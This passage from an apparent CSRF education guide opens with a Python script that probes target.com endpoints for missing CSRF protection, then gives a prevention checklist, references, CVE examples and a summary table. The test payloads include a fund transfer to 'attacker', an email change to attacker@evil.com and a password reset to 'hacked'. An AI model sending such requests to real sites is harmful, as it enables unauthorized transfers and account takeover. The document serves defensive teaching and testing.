from requests.cookies import RequestsCookieJar

def test_csrf_vulnerability(url, payload):
    """Test if endpoint is CSRF-vulnerable"""
    
    session = requests.Session()
    
    # 1. Authenticate (simulate valid session)
    session.post('https://target.com/login', 
                 data={'username': 'testuser', 'password': 'testpass'})
    
    # 2. Attempt request WITHOUT CSRF token
    response = session.post(url, data=payload)
    
    if response.status_code == 200:
        print(f"[VULNERABLE] {url} accepted request without CSRF token")
        return True
    elif response.status_code == 403:
        print(f"[PROTECTED] {url} rejected request (CSRF validation)")
        return False
    else:
        print(f"[UNKNOWN] {url} returned status {response.status_code}")
        return None

# Test endpoints
endpoints = [
    ('https://target.com/api/transfer', {'amount': 100, 'recipient': 'attacker'}),
    ('https://target.com/api/settings', {'email': 'attacker@evil.com'}),
    ('https://target.com/api/password', {'new_password': 'hacked'}),
]

for url, payload in endpoints:
    test_csrf_vulnerability(url, payload)
```

---

## Security Checklist

Use this checklist during code review and before deployment:

```
CSRF Prevention Checklist
========================

Token Generation
  □ CSRF tokens generated using cryptographically secure RNG
  □ Token length ≥ 128 bits (preferably 256 bits)
  □ Tokens are unique and unpredictable
  □ One token per form/request (not reused across sessions)

Token Validation
  □ Every POST/PUT/DELETE request validates CSRF token
  □ Token comparison uses hash_equals() (constant-time)
  □ Invalid token results in HTTP 403 response
  □ Missing token results in HTTP 403 response

Session Management
  □ Session cookies have HttpOnly flag set
  □ Session cookies have Secure flag set (HTTPS only)
  □ Session cookies have SameSite=Lax or SameSite=Strict
  □ Session timeout is configured (30 min inactivity recommended)
  □ Session invalidates on logout

HTTP Methods
  □ GET requests never modify state
  □ State changes use POST, PUT, DELETE only
  □ Referer header checked for dangerous operations
  □ Origin header validated for POST requests

XSS Prevention (Critical for CSRF Defense)
  □ All user input validated (whitelist approach)
  □ All output HTML-encoded
  □ All output attribute-encoded (quotes, etc.)
  □ Content Security Policy (CSP) headers set
  □ No inline JavaScript (external scripts only)

API Security
  □ CSRF tokens included in API requests
  □ Or: CORS properly configured (not *) + SameSite
  □ Custom headers used for token transmission
  □ Credentials: 'include' only when necessary

Testing
  □ Manual CSRF testing completed
  □ Automated security scan run (ZAP, Burp, etc.)
  □ Code review for CSRF vulnerabilities
  □ Penetration testing by security professional
```

---

## References

### Official Documentation
- [MITRE CWE-352](https://cwe.mitre.org/data/definitions/352.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - CSRF](https://owasp.org/www-project-web-security-testing-guide/)

### Standards & Specifications
- [RFC 6265: HTTP State Management (Cookies)](https://tools.ietf.org/html/rfc6265)
- [RFC 6265bis: SameSite Cookie Attribute](https://tools.ietf.org/html/draft-west-cookie-same-site)
- [W3C CORS Specification](https://fetch.spec.whatwg.org/#http-cors-protocol)

### Framework Documentation
- [Django CSRF Protection](https://docs.djangoproject.com/en/stable/ref/csrf/)
- [Laravel CSRF Protection](https://laravel.com/docs/csrf)
- [Rails CSRF Protection](https://guides.rubyonrails.org/security.html#csrf-countermeasures)
- [Spring Security CSRF](https://spring.io/guides/gs/securing-web/)

### Security Research
- **Felten & Zeller (2008):** "Cross-Site Request Forgeries: Exploitation and Prevention"
- **Jackson & Barth (2008):** "ForceHTTPS: Protecting High-Security Web Sites from Network Attacks"
- **Samy Worm (2005):** First major CSRF+XSS attack on MySpace (1M+ accounts)

### CVE Examples
- **CVE-2004-1703:** Add user accounts via CSRF
- **CVE-2005-1947:** Delete user data via CSRF
- **CVE-2009-3520:** Modify admin password via CSRF
- **CVE-2005-3952:** Samy Worm (CSRF + XSS on MySpace)

---

## Contributing

Found a CSRF vulnerability? Have suggestions for this guide?

1. Verify the vulnerability
2. Test mitigation strategies
3. Document findings with:
   - Target URL/endpoint
   - Attack vector
   - Impact assessment
   - Proof of concept (if possible)
4. Responsible disclosure

---

## License

This documentation is provided for educational and security research purposes.

---

## Summary

| Aspect | Details |
|--------|---------|
| **What** | Server fails to verify request intent; trusts session alone |
| **Impact** | Unauthorized transfers, account takeover, data theft |
| **Root Cause** | Confusing authentication with authorization |
| **Primary Defense** | CSRF tokens (256-bit, hash_equals validation) |
| **Secondary Defense** | SameSite=Lax cookies + Origin validation |
| **Tertiary Defense** | No GET state changes + XSS prevention |
| **Complexity** | Low to exploit, easy to defend |
| **Status** | Entirely preventable with proper implementation |

---

**Last Updated:** January 2026  
**CWE Chronicles Contributor:** Security Research Team
